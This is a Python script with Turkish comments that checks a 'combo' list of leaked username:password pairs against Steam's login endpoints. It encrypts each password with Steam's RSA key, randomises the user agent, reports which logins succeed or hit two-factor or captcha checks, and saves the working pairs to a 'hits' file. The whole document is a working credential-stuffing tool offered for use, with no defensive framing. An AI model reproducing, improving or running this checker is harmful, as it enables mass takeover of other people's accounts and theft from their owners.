import requests, time, json, rsa, urllib, base64
from user_agent import generate_user_agent as ua

class XeazrsSteam:
    def __init__(self, username, password):
        self.username, self.password, self.user_agent = username, password, ua()

    def xeazrs_gtrsky(self):
        response = requests.post(
            "https://steamcommunity.com/login/getrsakey/",
            data={"donotcache": str(int(time.time())), "username": self.username},
            headers=self.xeazrs_hdrs()
        )
        source = json.loads(response.text)
        return rsa.PublicKey(int(source["publickey_mod"], 16), int(source["publickey_exp"], 16)), source["timestamp"]

    def xeazrs_enc_pasw(self, key):
        return urllib.parse.quote(base64.b64encode(rsa.encrypt(self.password.encode(), key)).decode())

    def xeazrs_hdrs(self):
        return {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://steamcommunity.com",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": self.user_agent,
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-us"
        }

    def login(self):
        key, rsa_timestamp = self.xeazrs_gtrsky()
        data = {
            "donotcache": str(int(time.time())),
            "password": self.xeazrs_enc_pasw(key),
            "username": self.username,
            "twofactorcode": "",
            "emailauth": "",
            "loginfriendlyname": "",
            "captchagid": "-1",
            "captcha_text": "",
            "emailsteamid": "",
            "rsatimestamp": rsa_timestamp,
            "remember_login": "false",
            "oauth_client_id": "3638BFB1"
        }
        response = requests.post(
            "https://steamcommunity.com/login/dologin/",
            data=data,
            headers={
                **self.xeazrs_hdrs(),
                "Referer": "https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client"
            }
        )
        source = response.text
        if "success\":true" in source:
            print(f"Başarılı Giriş ✅: {self.username}")
            return f"{self.username}:{self.password}"
        elif "The account name or password that you have entered is incorrect" in source:
            print(f"Başarısız Giriş ❌: {self.username}")
        elif "requires_twofactor\":true" in source or "emailauth_needed\":true" in source:
            print(f"İki Faktör Gerekiyor ⚠️: {self.username}")
        elif "captcha_needed\":true" in source:
            print(f"Captcha Gerekiyor ⚠️: {self.username}")
        return None

def process_account(line):
    try:
        username, password = line.strip().split(':', 1)
        return XeazrsSteam(username, password).login()
    except ValueError:
        print(f"Hatalı format atlandı: {line.strip()}")
        return None

def main():
    # Kullanıcıdan dosya yolunu alıyoruz
    combo_path = input("Lütfen combo dosyasının yolunu girin: ")
    hits = []

    try:
        with open(combo_path, 'r') as file:
            lines = file.readlines()

        # Hesapları sırayla kontrol et
        for line in lines:
            result = process_account(line)
            if result:
                hits.append(result)

        # Başarılı girişleri kaydet
        if hits:
            with open('steam_hit_xeazrs.txt', 'w') as file:
                file.write("\n".join(hits))
            print(f"Başarılı hesaplar kaydedildi: 'steam_hit_xeazrs.txt'")

    except FileNotFoundError:
        print(f"Dosya bulunamadı: {combo_path}")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

if __name__ == "__main__":
    main()
